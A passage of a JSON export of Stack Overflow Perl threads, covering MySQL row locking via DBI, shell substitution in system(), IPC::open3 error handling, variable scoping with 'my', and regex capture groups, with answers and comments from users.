"profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457375620, "post_id": 35850357, "comment_id": 59368180, "body": "@MrTux: You&#39;re very confusing. Now you&#39;re saying that &quot;normal&quot; select queries aren&#39;t locked. Ever. That&#39;s just nonsense, and this will be my final comment"}, {"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457375902, "post_id": 35850357, "comment_id": 59368343, "body": "I was just saying a &quot;select for update&quot; in one transaction will not block normal &quot;select&quot; queries affecting the same rows as you&#39;re implying with &quot;Connections that need to access the data that you have locked will be suspended&quot; - mysql with repeadable read will just return the data was already committed."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 2997, "user_id": 3239842, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/43fb8ed63990c7b890667c0a6c5e4674?s=128&d=identicon&r=PG&f=1", "display_name": "Binarus", "link": "https://stackoverflow.com/users/3239842/binarus"}, "edited": false, "score": 1, "creation_date": 1457377220, "post_id": 35850357, "comment_id": 59369180, "body": "@Binarus Re. &quot;ALL other sorts of SELECT, UPDATE and DELETE will block&quot; Consistent reads (i.e. plain SELECTs) will not block. See <a href=\"http://dev.mysql.com/doc/refman/5.7/en/innodb-locking-reads.html\" rel=\"nofollow noreferrer\">dev.mysql.com/doc/refman/5.7/en/innodb-locking-reads.html</a>"}, {"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457377307, "post_id": 35850357, "comment_id": 59369224, "body": "I also added a hint for the first part 1 was talking about: <a href=\"http://pastebin.com/KKqBp5gB\" rel=\"nofollow noreferrer\">pastebin.com/KKqBp5gB</a>"}, {"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457377490, "post_id": 35850357, "comment_id": 59369342, "body": "Yeah, that&#39;s true ;) So, &quot;Any SELECT&quot; was a big too exhaustive."}, {"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457377622, "post_id": 35850357, "comment_id": 59369416, "body": "Just add this little detail, so that people can&#39;t missunderstand it and we&#39;re all happy! ;) - and we can remove this little conversation lateron..."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457377765, "post_id": 35850357, "comment_id": 59369490, "body": "@Borodin &quot;Any SELECT will be denied access to locked data. Otherwise it&#39;s not locked!&quot; Not true. According to the <a href=\"http://dev.mysql.com/doc/refman/5.7/en/innodb-locking-reads.html\" rel=\"nofollow noreferrer\">docs</a>, for <code>SELECT ... FOR UPDATE</code> &quot;Other transactions are blocked from updating those rows, from doing SELECT ... LOCK IN SHARE MODE, or from reading the data in certain transaction isolation levels. <i>Consistent reads ignore any locks set on the records that exist in the read view.</i>&quot; In other words, plain SELECTs don&#39;t block, they read from a snapshot."}, {"owner": {"reputation": 2997, "user_id": 3239842, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/43fb8ed63990c7b890667c0a6c5e4674?s=128&d=identicon&r=PG&f=1", "display_name": "Binarus", "link": "https://stackoverflow.com/users/3239842/binarus"}, "edited": false, "score": 0, "creation_date": 1457377867, "post_id": 35850357, "comment_id": 59369551, "body": "If you do SELECT ... FOR UPDATE, you will get an exclusive lock (write lock), meaning that other SELECT ... LOCK IN SHARE MODE, UPDATE and DELETE will block. If you do SELECT ... LOCK IN SHARE MODE, you get a non-exclusive lock (read lock), meaning that other reading SELECT ... LOCK IN SHARE MODE will not block, but all other UPDATE, DELETE and SELECT ... FOR UPDATE will block. This is true provided all operations are wrapped within transactions with isolation level and autocommit as described in my initial post, and it IMHO has nothing to do with additional read locks for the table."}, {"owner": {"reputation": 2997, "user_id": 3239842, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/43fb8ed63990c7b890667c0a6c5e4674?s=128&d=identicon&r=PG&f=1", "display_name": "Binarus", "link": "https://stackoverflow.com/users/3239842/binarus"}, "reply_to_user": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457377979, "post_id": 35850357, "comment_id": 59369626, "body": "@MrTux, ThisSuitIsBlackNot: Deleted all my comments and made a new correct one."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1457372536, "creation_date": 1457372536, "answer_id": 35850357, "question_id": 35848981, "link": "https://stackoverflow.com/questions/35848981/mysql-perl-dbi-execute-and-locking-exact-moment-of-locking/35850357#35850357", "title": "MySQL, Perl DBI, execute() and locking (exact moment of locking)", "body": "<p>Rather than</p>\n\n<pre><code>$h_DB-&gt;do(\"START TRANSACTION\");\n...\n$h_DB-&gt;do(\"COMMIT\");\n</code></pre>\n\n<p>you should probably be calling the <code>DBI</code> methods</p>\n\n<pre><code>$h_DB-&gt;begin_work;\n...\n$h_DB-&gt;commit;\n</code></pre>\n\n<p>The only difference is that you are second-guessing the database driver's behaviour in your own code while making it less portable. The <code>DBI</code> calls rely on the driver knowing how to start and stop transactions for this database, and is the proper way</p>\n\n<p>The essence of database transactions is that everything <em>inside</em> the transaction will go ahead unmolested by any parallel database connections. Some databases will simply lock the entire database for the duration of your transaction, but most will be more optimised and allow reads from anywhere and write to unrelated tables while your transaction is ongoing</p>\n\n<p>The implication of a <code>SELECT</code> with the <code>FOR UPDATE</code> qualifier is that you are asking for a transaction to be started when the read begins, and there is no need to explicitly open a transaction yourself. Once you have obtained the values they will not be changed, and nor will anything else in the database that affects them. Connections that need to access the data that you have locked will be suspended unless they have asked for <em>dirty read</em> functionality</p>\n\n<p>Does that cover everything?</p>\n"}], "owner": {"reputation": 2997, "user_id": 3239842, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/43fb8ed63990c7b890667c0a6c5e4674?s=128&d=identicon&r=PG&f=1", "display_name": "Binarus", "link": "https://stackoverflow.com/users/3239842/binarus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1068, "favorite_count": 0, "accepted_answer_id": 35849326, "answer_count": 2, "score": 1, "last_activity_date": 1598221447, "creation_date": 1457368321, "last_edit_date": 1457369081, "question_id": 35848981, "link": "https://stackoverflow.com/questions/35848981/mysql-perl-dbi-execute-and-locking-exact-moment-of-locking", "title": "MySQL, Perl DBI, execute() and locking (exact moment of locking)", "body": "<p>I am working on a Perl / DBI / DBD / MySQL application. I am using InnoDB with transaction level \"repeatable read\" and \"autocommit = 0\". To protect data which I am manipulating against concurrent manipulation by other threads or connections, I am using the following pattern (which is quite common):</p>\n\n<pre><code>$h_DB -&gt; do(\"START TRANSACTION\");\n\n$s_SQL = \"SELECT data from Users where ID = ? FOR UPDATE\";\n$h_ST = $h_DB -&gt; prepare($s_SQL);\n$h_ST -&gt; execute($s_ID);\n\n# Do some other stuff\n\n@ar_Row = $h_ST -&gt; fetchrow_array();\n\n# Do data manipulation\n\n$h_DB -&gt; do(\"COMMIT\")\n</code></pre>\n\n<p>For clarity, I have left away the error handling and the variable declarations, but I think the variable names are self-explaining.</p>\n\n<p>My question is: When exactly are the locks (in this case: the exclusive locks) put onto the respective row? Are they already in place after the execute has run, or are they active no sooner than after the row has been fetched? In other words, are the locks already in place in the section designated \"# Do some other stuff\"?</p>\n\n<p>Normally, it is easy to answer such questions by doing some research using the MySQL command line tools. But in this case, I think this is not possible for the following reasons:</p>\n\n<p>1) I am not sure if the MySQL client behaves exactly like Perl's DBI / DBD.</p>\n\n<p>2) Of course, the example above is extremely simplified. Actually, I'd like to know when the locks are set when using the pattern above, but locking several hundred rows at once, i.e. several hundred rows matching the WHERE clause.</p>\n\n<p>I don't think I could use the command line client to find out because with large data sets there might be buffering which might be handled differently by Perl and the command line client, and I doubt that I could \"simulate\" a statement which has been executed in Perl, but whose result rows have not been fetched yet, by using something like \"LIMIT 0\" in the command line client.</p>\n\n<p>Could somebody give a definitive answer?</p>\n"}, {"tags": ["perl", "system"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "edited": false, "score": 1, "creation_date": 1457368474, "post_id": 35848955, "comment_id": 59363536, "body": "@toolic, <code>system</code> doesn&#39;t use <code>tcsh</code>, so that&#39;s a rather useless statement."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 5, "last_activity_date": 1457370842, "last_edit_date": 1457370842, "creation_date": 1457368717, "answer_id": 35849119, "question_id": 35848955, "link": "https://stackoverflow.com/questions/35848955/string-replacement-within-perl-system-command/35849119#35849119", "title": "string replacement within perl system() command", "body": "<pre><code>perl -e '$i=\"file.bed\"; system(\"...\")'\n</code></pre>\n\n<p>is short for</p>\n\n<pre><code>perl -e '$i=\"file.bed\"; system(\"/bin/sh\", \"-c\", \"...\")'\n</code></pre>\n\n<p>but <code>${j/.bed/.bam}</code> isn't supported by <code>sh</code>. Use</p>\n\n<pre><code>perl -e '$i=\"file.bed\"; system(\"bash\", \"-c\", \"...\")'\n</code></pre>\n"}], "owner": {"reputation": 613, "user_id": 3935165, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/216aab2c76fcd2102e7439f001db2eec?s=128&d=identicon&r=PG&f=1", "display_name": "Roy", "link": "https://stackoverflow.com/users/3935165/roy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 116, "favorite_count": 0, "accepted_answer_id": 35849119, "answer_count": 1, "score": 0, "last_activity_date": 1457370842, "creation_date": 1457368237, "last_edit_date": 1457368504, "question_id": 35848955, "link": "https://stackoverflow.com/questions/35848955/string-replacement-within-perl-system-command", "title": "string replacement within perl system() command", "body": "<p>The following commands and question is merely aim to figure out proper syntax, so please don't seek for any deep purpose behind it, but rather if you know the proper syntax this would be of a huge help to me. </p>\n\n<p>I have the following:\n*using here perl -e in order to mimic a perl file that calls to system() command in order to execute unix commands.</p>\n\n<pre><code>perl -e '$i=\"file.bed\"; system(\"j=$i; echo ${i} ;echo \\${j}; echo \\${j%.*};\")';\n</code></pre>\n\n<p>this command nicely outputs:</p>\n\n<pre><code>file.bed\nfile.bed\nfile\n</code></pre>\n\n<p>I'd like to add another echo that replaces the suffix \".bed\" to the suffix \".bam\"\nI tried:</p>\n\n<pre><code>perl -e '$i=\"file.bed\"; system(\"j=$i; echo ${i} ;echo \\${j}; echo \\${j%.*}; echo \\${j/.bed/.bam}\")';\n</code></pre>\n\n<p>but i get:</p>\n\n<pre><code>file.bed\nfile.bed\nfile\nsh: 1: Bad substitution\n</code></pre>\n\n<p>same goes for: </p>\n\n<pre><code>perl -e '$i=\"file.bed\"; system(\"j=$i; echo ${i} ;echo \\${j}; echo \\${j%.*}; echo \\${j\\/.bed\\/.bam}\")';\n</code></pre>\n\n<p>So for some reason the suffix removal [%.*] works just fine within system(), but {//} substitution fails. </p>\n\n<p>Any ideas? </p>\n"}, {"tags": ["perl", "ipcopen3"], "comments": [{"owner": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "edited": false, "score": 0, "creation_date": 1457372048, "post_id": 35848510, "comment_id": 59366038, "body": "Note that in general, there&#39;s no way to read from both stdout and stderr without using select or risking a deadlock."}, {"owner": {"reputation": 85, "user_id": 4025188, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oqZkW.jpg?s=128&g=1", "display_name": "Azam Khan", "link": "https://stackoverflow.com/users/4025188/azam-khan"}, "reply_to_user": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "edited": false, "score": 0, "creation_date": 1457372233, "post_id": 35848510, "comment_id": 59366139, "body": "Is there any other way to achieve same result , I was checking IPC:Run ."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457376832, "post_id": 35848510, "comment_id": 59368922, "body": "Yes, you can use IPC::Run (and possibly the simpler IPC::Run3) if it can be done using open3 and select."}], "answers": [{"tags": [], "owner": {"reputation": 85, "user_id": 4025188, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oqZkW.jpg?s=128&g=1", "display_name": "Azam Khan", "link": "https://stackoverflow.com/users/4025188/azam-khan"}, "is_accepted": true, "score": 1, "last_activity_date": 1461739480, "creation_date": 1461739480, "answer_id": 36882273, "question_id": 35848510, "link": "https://stackoverflow.com/questions/35848510/ipcopen3-error-handling-with-out-select/36882273#36882273", "title": "IPC::open3 error handling with out select", "body": "<p>I was able to achieve this from below code -</p>\n\n<pre><code>sub writeTologs {\nmy $cmd      = shift;\nmy $strout   = \"$LOGDIR/$STDLOG\";\nmy $strerr   = \"$LOGDIR/$ERRORLOG\";\nmy $flag     = 0;\nmy $line     = '';\nmy $pid;\n\nopen(ERRLOG   , '&gt;&gt;', $strerr  ) or die \"Can't open error log! $!\";\nopen(SCHDLOG , '&gt;&gt;', $strout  ) or die \"Can't open output log! $!\";\n\nmy ($infh,$outfh,$errfh);\n$errfh = gensym();\n\neval\n{\n    $pid = open3($infh, $outfh, $errfh, $cmd);\n};\ndie \"Open faile : $@\" if $@;\n\nmy $line_err  = &lt;$errfh&gt;;\n\nif (defined(&lt;$outfh&gt;))\n{\n    while($line = &lt;$outfh&gt;)\n    {\n            print SCHDLOG '[' . get_timestamp() . \"]: $line\";\n    }\n}\n\nif ($line_err)\n{\n    print ERRLOG $line_err;\n    $flag =1 ;\n}\n\nprint \"PID = $pid\";\n\nwaitpid($pid,0);\n\nclose(ERRLOG)  or die \"Can't close filehandle! $!\";\nclose(SCHDLOG) or die \"Can't close filehandle! $!\";\nreturn $flag;\n}\n</code></pre>\n"}], "owner": {"reputation": 85, "user_id": 4025188, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oqZkW.jpg?s=128&g=1", "display_name": "Azam Khan", "link": "https://stackoverflow.com/users/4025188/azam-khan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 179, "favorite_count": 0, "accepted_answer_id": 36882273, "answer_count": 1, "score": 1, "last_activity_date": 1461739480, "creation_date": 1457366968, "question_id": 35848510, "link": "https://stackoverflow.com/questions/35848510/ipcopen3-error-handling-with-out-select", "title": "IPC::open3 error handling with out select", "body": "<p>The below code is working fine but i want to achieve same thing without using IO::Select - \nI tried few things but nothing works, as I am not much familiar with perl.</p>\n\n<pre><code>sub writeTologs\n{\nmy $cmd=shift;\n\nopen(ERRLOG, '&gt;&gt;log//error.log') or die \"Can't open error log! $!\";\nopen(OUTPUT, '&gt;&gt;log//output.log') or die \"Can't open output log! $!\";\n\nmy ($infh,$outfh,$errfh); # these are the FHs for our child\n$errfh = gensym(); # we create a symbol for the errfh   # because open3 will not do that for us\n\nmy $pid;\n               #\neval{\n$pid = open3($infh, $outfh, $errfh, $cmd);\n};\ndie \"open3: $@\\n\" if $@;\n               #\nprint \"PID was $pid\\n\";\n\n\nmy $sel = new IO::Select; # create a select object to notify\n                      # us on reads on our FHs (File Handlers)\n$sel-&gt;add($outfh,$errfh); # add the FHs we're interested in\n                      #\n    while(my @ready = $sel-&gt;can_read) { # read ready\n            foreach my $fh (@ready) {\n                    my $line = &lt;$fh&gt;; # read one line from this fh\n                    if(not defined $line){ # EOF on this FH\n                    $sel-&gt;remove($fh); # remove it from the list\n                    next;              # and go handle the next FH\n                    }\n\n                    if($fh == $outfh) {     # if we read from the outfh\n                            print OUTPUT $line; # print it to OUTFH\n                    }\n                    elsif($fh == $errfh) {# do the same for errfh\n                            print ERRLOG $line;\n                            die \"Error found : $@\";\n                            }\n                            else { # we read from something else?!?!\n                                    die \"Shouldn't be here\\n\";\n                            }\n                    }\n    }\n\nclose(ERRLOG) or die \"Can't close filehandle! $!\";\nclose(OUTPUT) or die \"Can't close filehandle! $!\";\n\n }\n</code></pre>\n\n<p>I want to die my process after writing to ERRLOG . </p>\n\n<p>I have tried below code- </p>\n\n<pre><code>open(ERRLOG, '&gt;&gt;log//error.log') or die \"Can't open error log! $!\";\nopen(OUTPUT, '&gt;&gt;log//output.log') or die \"Can't open output log! $!\";\n\nmy ($infh,$outfh,$errfh); # these are the FHs for our child\n$errfh = gensym(); # we create a symbol for the errfh   # because open3 will not do that for us\n\nmy $pid;\nmy $line=\"\";                   #\neval{\n$pid=open3($infh, $outfh, $errfh, $cmd1);\n};\ndie \"open3: $@\\n\" if $@;\n\nif (defined(&lt;$errfh&gt;)) {\n        print \"Error start \".&lt;$errfh&gt;;\n        $errfh-&gt;close;\n        while($line = &lt;$errfh&gt;) {\n                print $line;\n                print \"Inside while\";\n        }\n\n        print \"Error deifned \\n\";\n} else {\n\n        while ($line=&lt;$outfh&gt;) {\n                print OUTPUT $line;\n        }\n        print \"Output log\";\n}\n</code></pre>\n\n<p>But while loop is not getting executed inside the if condition.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1457354871, "post_id": 35844089, "comment_id": 59353645, "body": "Are you using <code>use strict</code> and <code>use warnings</code>?"}, {"owner": {"reputation": 5296, "user_id": 418066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/38yuw.png?s=128&g=1", "display_name": "Biffen", "link": "https://stackoverflow.com/users/418066/biffen"}, "edited": false, "score": 3, "creation_date": 1457354906, "post_id": 35844089, "comment_id": 59353667, "body": "Don&#39;t use <code>my</code> the second time."}, {"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 1, "creation_date": 1457360217, "post_id": 35844089, "comment_id": 59357301, "body": "Use placeholders instead of interpolating them in a string. Assuming of course you are using DBI, which you should. To not do so is exposing yourself to SQL injection and bugs."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457370324, "post_id": 35844176, "comment_id": 59364902, "body": "It seems that no one is taught in school the policy of <i>&quot;[declaring] variables in the smallest scope necessary&quot;</i>. A huge number of people\u2014it seems like the majority\u2014declare all necessary variables in a block at the start of the file, FORTRAN style. That hasn&#39;t even been necessary in C since C99, seventeen years ago. Rather unrelated, I think there should be a purge of online tutorials that teach Perl 4 techniques, but sadly <a href=\"http://www.learning-perl.com/2013/05/why-we-teach-the-subroutine-ampersand/\" rel=\"nofollow noreferrer\"><i>Brian D Foy</i> disagrees with me on this</a>. Oh, and the <i>purge</i> was a joke anyway"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457371187, "post_id": 35844176, "comment_id": 59365491, "body": "@bo he&#39;s going to disagree with your capitalisation of his name too. He has a tutorial for that on his website . ;-)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457371249, "post_id": 35844176, "comment_id": 59365536, "body": "Tough, that&#39;s his name! I put the <b>D</b> in for him and that&#39;s plenty enough. It&#39;s not really up to him what people call him"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 7, "last_activity_date": 1457355251, "last_edit_date": 1457355251, "creation_date": 1457354938, "answer_id": 35844176, "question_id": 35844089, "link": "https://stackoverflow.com/questions/35844089/overwriting-a-variable/35844176#35844176", "title": "Overwriting a variable", "body": "<p>The keyword <code>my</code> is used to <em>declare</em> a variable. That means it will tell Perl about a new variable in a given <a href=\"http://perlmaven.com/scope-of-variables-in-perl\" rel=\"noreferrer\">scope</a>. You only have to do that once. After you have declared the variable, you can <em>assign</em> to it as often as you want.</p>\n\n<pre><code>my $foo = 'foo';\n$foo = 'bar';\n</code></pre>\n\n<p>But that is not the only issue here.</p>\n\n<blockquote>\n  <p>Now if a certain condition is met (lets assume it is here), I'm attempting to reassign</p>\n</blockquote>\n\n<p>This probably looks like the following:</p>\n\n<pre><code>my $foo = 'foo';\nif ( $bar ) {\n  my $foo = 'bar';\n}\n</code></pre>\n\n<p>Now you have <strong>declared a new <em>lexical</em> version</strong> of <code>$foo</code> in the smaller <em>scope</em> of those braces after the <code>if</code>. You are not overwriting the existing <code>$foo</code> in the outer <em>scope</em>. That's why the value does not change. </p>\n\n<p>Here are some tips/a summary about this:</p>\n\n<ul>\n<li><em>declare</em> variables in the smallest scope necessary</li>\n<li><em>declare</em> variables as late as possible</li>\n<li>don't <em>declare</em> variables twice</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 249, "user_id": 5938556, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9766fd8fcf95fa6b40efd34886f08c08?s=128&d=identicon&r=PG&f=1", "display_name": "yael", "link": "https://stackoverflow.com/users/5938556/yael"}, "is_accepted": false, "score": 2, "last_activity_date": 1457355019, "creation_date": 1457355019, "answer_id": 35844203, "question_id": 35844089, "link": "https://stackoverflow.com/questions/35844089/overwriting-a-variable/35844203#35844203", "title": "Overwriting a variable", "body": "<p>if you are assigning :</p>\n\n<pre><code>my $new_filename =\"$common::conf{'html_dir'}/images/banners/$lc_prodid.$filetype\";\n</code></pre>\n\n<p>inside the if clause then it is local to the scope of the if statement and will not override the variable declared outside, you need to omit the my in the second assingment</p>\n"}], "owner": {"reputation": 1246, "user_id": 4577456, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10152662960092727/picture?type=large", "display_name": "Liam Fell", "link": "https://stackoverflow.com/users/4577456/liam-fell"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 343, "favorite_count": 0, "accepted_answer_id": 35844176, "answer_count": 2, "score": 1, "last_activity_date": 1457355251, "creation_date": 1457354641, "question_id": 35844089, "link": "https://stackoverflow.com/questions/35844089/overwriting-a-variable", "title": "Overwriting a variable", "body": "<p>I'm still in the early days with Perl, so apologies if this is obvious.</p>\n\n<p>I'm declaring a variable in Perl as shown below:</p>\n\n<pre><code>my $new_filename = 'nope';\n</code></pre>\n\n<p>Now if a certain condition is met (lets assume it is here), I'm attempting to reassign the value of <code>$new_filename</code> like so:</p>\n\n<pre><code>my $new_filename = \"$common::conf{'html_dir'}/images/banners/$lc_prodid.$filetype\";\n</code></pre>\n\n<p>I'm them assigning the valuu to a table:</p>\n\n<pre><code>my $sql_query = qq(INSERT INTO banner_image (link, title, active, imageloc, rank) VALUES ('$link_text','$banner_text','$active','$new_filename','$new_rank'));\n</code></pre>\n\n<p>The issue I have is <code>$new_filename</code> always appears as 'nope' in the database. Could anyone suggest why this might be?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1457363541, "post_id": 35843679, "comment_id": 59359831, "body": "What are you expecting to get? Because <code>$m</code> is going to to be the content of the capturing bracket ( <code>cat</code> or <code>&#39;&#39;</code>) not the whole word."}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 1, "last_activity_date": 1457374265, "last_edit_date": 1457374265, "creation_date": 1457353723, "answer_id": 35843788, "question_id": 35843679, "link": "https://stackoverflow.com/questions/35843679/perl-grouping-things-and-hierarchical-matching/35843788#35843788", "title": "perl Grouping things and hierarchical matching", "body": "<p>You probably misunderstood the comment. It means that</p>\n\n<pre><code>for my $t (qw( housecats house )) {\n    my ($m) = $t =~ /house(cat|)/;\n    print \"[$m]\\n\";\n}\n</code></pre>\n\n<p>will print </p>\n\n<pre><code>[cat]\n[]\n</code></pre>\n\n<p>i.e. the regex will match both <code>housecat</code> and <code>house</code>. If the pattern didn't match at all then <code>$m</code> would be <code>undef</code></p>\n"}, {"comments": [{"owner": {"reputation": 32690, "user_id": 3266847, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U0oyt.png?s=128&g=1", "display_name": "Benjamin W.", "link": "https://stackoverflow.com/users/3266847/benjamin-w"}, "edited": false, "score": 0, "creation_date": 1457493996, "post_id": 35843933, "comment_id": 59427563, "body": "While this code may answer the question, providing additional context regarding <i>why</i> and/or <i>how</i> this code answers the question improves its long-term value."}], "tags": [], "owner": {"reputation": 11, "user_id": 4559900, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/82c0b7b9cdb19366431b945a7912cbda?s=128&d=identicon&r=PG&f=1", "display_name": "tar", "link": "https://stackoverflow.com/users/4559900/tar"}, "is_accepted": false, "score": 